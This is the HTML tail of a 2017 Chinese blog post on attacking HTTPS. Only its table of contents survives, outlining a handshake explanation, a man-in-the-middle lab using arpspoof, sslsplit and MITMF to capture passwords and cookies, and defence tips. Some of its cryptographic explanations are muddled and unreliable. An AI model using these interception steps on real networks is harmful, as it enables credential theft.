连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）"><span class="toc-number">2.0.3.</span> <span class="toc-text">3. 然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书"><span class="toc-number">2.0.4.</span> <span class="toc-text">4. client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#【-】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。"><span class="toc-number">2.0.5.</span> <span class="toc-text">【*】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server"><span class="toc-number">2.0.6.</span> <span class="toc-text">5. 验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了"><span class="toc-number">2.0.7.</span> <span class="toc-text">6. server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端"><span class="toc-number">2.0.8.</span> <span class="toc-text">7. 通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#【-】hash-private-encrypt-data-public-encrypt-hash-emsp-–-gt-emsp-server"><span class="toc-number">2.0.9.</span> <span class="toc-text">【*】hash(private_encrypt(data)) + public_encrypt(hash) –> server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data"><span class="toc-number">2.0.10.</span> <span class="toc-text">8. server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#server发送数据过程类似："><span class="toc-number">2.1.</span> <span class="toc-text">server发送数据过程类似：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#【-】hash-private-encrypt-data-private-encrypt-hash-emsp-–-gt-emsp-client"><span class="toc-number">2.1.1.</span> <span class="toc-text">【*】hash(private_encrypt(data)) + private_encrypt(hash) –> client</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-攻击实战"><span class="toc-number">3.</span> <span class="toc-text">0x02. 攻击实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境准备"><span class="toc-number">3.1.</span> <span class="toc-text">环境准备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-1-sslsplit、arpspoof"><span class="toc-number">3.1.1.</span> <span class="toc-text">  1. sslsplit、arpspoof</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-2-win-7"><span class="toc-number">3.1.2.</span> <span class="toc-text">  2. win 7</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实战步骤"><span class="toc-number">3.2.</span> <span class="toc-text">实战步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-打开kali的数据包转发功能"><span class="toc-number">3.3.</span> <span class="toc-text">1. 打开kali的数据包转发功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）"><span class="toc-number">3.4.</span> <span class="toc-text">2. 设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-利用openssl生成私钥"><span class="toc-number">3.5.</span> <span class="toc-text">3. 利用openssl生成私钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-利用私钥签名生成的证书"><span class="toc-number">3.6.</span> <span class="toc-text">4. 利用私钥签名生成的证书</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-启动arpspoof进行中间人攻击"><span class="toc-number">3.7.</span> <span class="toc-text">5. 启动arpspoof进行中间人攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-创建log目录，启动sslsplit"><span class="toc-number">3.8.</span> <span class="toc-text">6. 创建log目录，启动sslsplit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误"><span class="toc-number">3.8.1.</span> <span class="toc-text">[*]如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-剩下的就是用正则匹配出想要的账号密码或者cookie了"><span class="toc-number">3.9.</span> <span class="toc-text">7. 剩下的就是用正则匹配出想要的账号密码或者cookie了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文"><span class="toc-number">3.10.</span> <span class="toc-text">8. 当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方法多种多样，大家还可以尝试其他工具，这里就不一一列举了"><span class="toc-number">3.10.1.</span> <span class="toc-text">[*]方法多种多样，大家还可以尝试其他工具，这里就不一一列举了</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-防御建议"><span class="toc-number">4.</span> <span class="toc-text">0x03. 防御建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#服务端防御"><span class="toc-number">4.1.</span> <span class="toc-text">服务端防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-配置最安全的https"><span class="toc-number">4.1.1.</span> <span class="toc-text">  配置最安全的https</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文"><span class="toc-number">4.1.2.</span> <span class="toc-text">  密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#客户端防御"><span class="toc-number">4.2.</span> <span class="toc-text">客户端防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-配置路由规则，绑定IP／MAC以防被ARP欺骗"><span class="toc-number">4.2.1.</span> <span class="toc-text">  配置路由规则，绑定IP／MAC以防被ARP欺骗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开"><span class="toc-number">4.2.2.</span> <span class="toc-text">  谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-少去蹭网，往往免费的东西才是最贵的"><span class="toc-number">4.2.3.</span> <span class="toc-text">  少去蹭网，往往免费的东西才是最贵的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-珍爱生命，远离黑客"><span class="toc-number">4.2.4.</span> <span class="toc-text">  珍爱生命，远离黑客</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-结语"><span class="toc-number">4.3.</span> <span class="toc-text">0x04. 结语</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。"><span class="toc-number">4.3.1.</span> <span class="toc-text">  本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"HTTPS攻击　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section class="youyan" id="comments">
+    <script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2142877';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <aside class="comment-bar">
+        <a href="javascript:void(0);">
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").hover(function(){
+            load$hide();
+        })
+        if (window.location.hash === "#comments") {
+            load$hide();
+        }
+    </script>
+
+    <div id="uyan_frame"></div>
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/10/13/The-Backdoor-Factory/" title="下一篇: The-Backdoor-Factory">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/10/27/HTTPS攻击/">HTTPS攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/The-Backdoor-Factory/">The-Backdoor-Factory</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/08/Metasploit/">Metasploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/02/MITMF/">MITMF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/02/无线渗透-序章-中间人攻击/">无线渗透(序章)--中间人攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/Slowhttptest/">Slowhttptest</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/TearDrop/">TearDrop</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/23/SOCKSTRESS/">SOCKSTRESS</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/21/Syn-Flood/">Syn-Flood</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/03/无线渗透(下)—企业级WPA破解/">无线渗透(下)—企业级WPA破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/无线渗透(中)--WPS破解/">无线渗透(中)--WPS破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/30/无线渗透(上)--WPA加密/">无线渗透(上)--WPA加密</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/信息收集— 僵尸扫描/">信息收集— 僵尸扫描</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017 TimeS0ng
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
